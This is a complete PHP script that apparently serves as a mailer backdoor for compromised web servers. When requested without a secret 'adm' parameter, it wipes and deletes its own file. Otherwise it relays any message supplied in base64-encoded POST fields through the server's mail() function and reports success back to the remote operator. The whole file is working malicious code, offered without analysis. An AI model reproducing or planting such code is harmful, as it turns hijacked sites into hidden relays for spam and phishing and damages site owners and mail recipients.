<?php
if(!isset($_GET['adm'])){
	$path = dirname(__FILE__);
	$filename = $_SERVER['PHP_SELF'];
	if(file_exists($path.$filename)){	
		$fgood = fopen($path.$filename, 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink($path.$filename);
	}
	if(file_exists($_SERVER['SCRIPT_FILENAME'])){
		$fgood = fopen($_SERVER['SCRIPT_FILENAME'], 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink($_SERVER['SCRIPT_FILENAME']);
	}
	if(file_exists(__FILE__)){
		$fgood = fopen(__FILE__, 'w');
		fwrite($fgood, '');
		fclose($fgood);
		unlink(__FILE__);	
	}
}
if(isset($_POST["mailto"]))
        $MailTo = base64_decode($_POST["mailto"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgheader"]))
        $MessageHeader = base64_decode($_POST["msgheader"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgbody"]))
        $MessageBody = base64_decode($_POST["msgbody"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgsubject"]))
        $MessageSubject = base64_decode($_POST["msgsubject"]);
else
	{
	echo "indata_error";
	exit;
	}
if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))
	echo "sent_ok";
else
	echo "sent_error";
?>